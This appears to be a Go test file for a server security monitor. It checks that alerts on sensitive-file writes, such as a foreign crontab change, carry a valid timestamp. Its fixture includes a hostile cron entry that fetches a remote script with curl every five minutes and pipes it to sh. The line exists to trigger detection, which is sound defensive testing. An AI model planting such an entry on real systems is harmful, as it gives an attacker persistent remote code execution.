package checks

import (
	"testing"
	"time"

	"github.com/pidginhost/csm/internal/alert"
)

// The realtime sensitive-file finding reached the alert pipeline with a zero
// Timestamp, so it was dated 0001-01-01 wherever it was shown. Three of these
// landed in one day on a production host. The periodic hash-change finding in
// the same file already stamped its own time; this path did not.
func TestEvaluateSensitiveFileWriteStampsTimestamp(t *testing.T) {
	resetSelfWrites(t)

	before := time.Now()
	got, emit := EvaluateSensitiveFileWriteSnapshot(
		"/var/spool/cron/alice", 0, 4242, "crontab",
		[]byte("*/5 * * * * curl -s http://198.51.100.9/x | sh\n"), true)
	after := time.Now()

	if !emit {
		t.Fatal("expected a finding for a foreign crontab write")
	}
	if got.Check != "sensitive_file_modified" {
		t.Fatalf("Check = %q, want sensitive_file_modified", got.Check)
	}
	if got.Timestamp.IsZero() {
		t.Fatal("Timestamp is zero; the finding would be dated 0001-01-01 everywhere it is shown")
	}
	if got.Timestamp.Before(before) || got.Timestamp.After(after) {
		t.Errorf("Timestamp = %v, want a time within [%v, %v]", got.Timestamp, before, after)
	}
}

// A demoted finding travels the same path and must keep its stamp.
func TestSensitiveFileDemotionKeepsTimestamp(t *testing.T) {
	stamped := alert.Finding{
		Severity:  alert.High,
		Check:     "sensitive_file_modified",
		Timestamp: time.Now(),
	}
	got := rescoreSensitive(stamped, "cron", nil, 0, time.Now())
	if got.Timestamp.IsZero() {
		t.Fatal("rescoreSensitive dropped the finding's timestamp")
	}
}
